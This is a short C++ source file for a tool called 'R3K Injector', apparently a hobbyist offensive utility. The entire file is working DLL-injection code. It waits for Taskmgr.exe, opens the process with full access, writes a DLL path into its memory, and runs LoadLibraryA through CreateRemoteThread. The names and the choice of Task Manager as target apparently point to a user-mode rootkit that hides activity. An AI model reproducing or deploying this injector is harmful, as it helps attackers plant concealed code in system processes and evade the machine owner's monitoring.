/*

By idchoppers, 9/15/21

*/

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

DWORD GetProcId(const wchar_t* procName) // Takes a process name as a wide character
{
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Make a snapshot of all running processes

	if (hSnap != INVALID_HANDLE_VALUE) // If the snapshot is a valid snapshot
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(procEntry); 

		if (Process32First(hSnap, &procEntry)) // If there is a process entry in the snapshot
		{
			do
			{
				if (!wcscmp(procEntry.szExeFile, procName)) // Compare the processes to the correct process ID until it is found
				{
					procId = procEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &procEntry)); // Cycle through the processes
		}
	}
	CloseHandle(hSnap); // Close the handle and return the process ID
	return procId;
}

int main()
{
	std::cout << "\n";
	std::cout << "###################################\n";
	std::cout << "#                                 #\n";
	std::cout << "#           R3K Injector          #\n";
	std::cout << "#          By: idchoppers         #\n";
	std::cout << "#                                 #\n";
	std::cout << "###################################\n";
	std::cout << "\n";

	const char* dllPath = "C:\\Users\\ks\\Desktop\\RKH.dll"; // Path to dll to inject
	const wchar_t* procName = L"Taskmgr.exe"; // Process to inject into
	DWORD procId = 0;

	std::cout << "[*] Getting process... \n";
	while (!procId) // Get the target process
	{
		procId = GetProcId(procName);
		Sleep(30);
	}

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);
	
	std::cout << "[D] Found target process! \n";
	if (hProc && hProc != INVALID_HANDLE_VALUE) // If hProc is a valid process
	{
		std::cout << "[*] Allocating memory... \n";
		void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Stores the location of where the dll will be written in the target
		std::cout << "[D] Finished allocating memory! \n";

		std::cout << "[*] Writing DLL to memory... \n";
		WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0); // Gives the target some more virtual memory to fit the dll
		std::cout << "[D] DLL written! \n";

		std::cout << "[*] Creating new thread in target... \n";
		HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0); // Creates the thread for the dll to run in the target's memory
		std::cout << "[D] Done creating thread! \n";
		
		if (hThread) // Close hThread when done
		{
			std::cout << "[*] Exiting hThread... \n";
			CloseHandle(hThread);
		}
	}

	if (hProc) // Close hProc when done
	{
		std::cout << "[*] Exiting hProc... \n";
		CloseHandle(hProc);
	}

	std::cout << "[D] DLL injection successful! \n";
	//system("pause");
	return 0;
}